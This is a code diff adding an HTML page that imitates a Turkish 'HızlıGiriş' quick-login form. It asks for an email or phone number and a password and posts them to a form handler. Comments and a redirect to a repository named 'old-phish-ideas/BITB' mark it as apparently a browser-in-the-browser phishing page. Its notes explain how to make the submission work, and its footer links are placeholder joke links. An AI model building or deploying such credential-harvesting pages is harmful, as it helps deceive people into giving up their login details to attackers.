@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <link rel="stylesheet" href="FastCss.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
+</head>
+
+<body>
+
+    <div class="space"></div>
+    <!-- FROM ACTON HERE-->
+    <form class="modal-content animate" action="/action_page.php" method="post">
+        <div class="container">
+            <div class="space-fst">
+                <div style="margin-top:5px;">
+                    <img id="hizligiris-logo" src="favicon24.ico" style="height: 0.9em;">
+                    <span class='text'><strong style="color: black">Hızlı</strong>Giriş</span>
+                </div>
+            </div>
+            
+            <!-- TAB Code - Removed Phone Number Tab
+            <div class="tab__buttons" role="tablist">
+                <a role="tab" aria-selected="true" class="tab__button js-email-tab tab__button--active" tabindex="0">
+                    <i class="fa-solid fa-at"></i>
+                    <span>E-posta Adresi</span>
+                </a>
+            </div> -->
+
+            <!-- Inputs -->
+            <div class="input-labal">
+                <label for="uname"><b>E-Posta / Telefon Numarası</b></label>
+                <input type="text" name="uname" required>
+                <label for="psw"><b>Şifre</b></label>
+                <input type="password" name="psw" required>
+            </div>
+
+            <div class="labels">
+                <label>
+                    <input type="checkbox" checked="checked" disabled name="remember"> HızlıGiriş Şifresi ile Gir 
+                    <div class="tooltip">  <i class="fa-solid fa-circle-info"></i>
+                        <span class="tooltiptext">E-posta ile girişte şifre zorunludur.</span>
+                      </div><br>
+                    <input type="checkbox" checked="checked" name="remember"> Beni Hatırla
+                </label>
+            </div>
+            <!-- Login Button - Delete onclick function for it to work-->
+            <button class="btn" id="webLogin-button" onClick="myFunction()" type="submit ">Giriş Yap</button>
+        </div>
+
+        <div class="container " style="background-color:transparent ">
+            <button id="btn btn--transparent " style="background-color:transparent; color: #2962ff; ">
+                <i class="fa-solid fa-check fa-xl "></i>
+                <span class='text'><strong style="color: black ">Hızlı</strong><a style="color: black ">Giriş</a> 
+                    <strong>Bilgilerini Güncelle</strong> </span>
+            </button>
+        </div>
+    </form>
+    <!-- Footer - Links are Rick Rolls-->
+    <div class="main-footer ">
+        <div class="container " style="background-color:transparent ">
+            <nav class="main-footer__nav ">
+                <div>
+                    <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ " style="text-decoration: none; ">Aydınlatma Metni</a> ve
+                    <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ " style="text-decoration: none; ">Çerez </a>
+                </div>
+                <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ " style="text-decoration: none; ">Hakkında</a>
+            </nav>
+        </div>
+    </div>
+    <!-- For ease of testing, delete after merging post function-->
+    <script>
+        function myFunction() {
+            window.location.href = "https://omerwwazap.github.io/old-phish-ideas/BITB//Fastlogin.html";
+        }
+    </script>
+</body>
+
+</html>
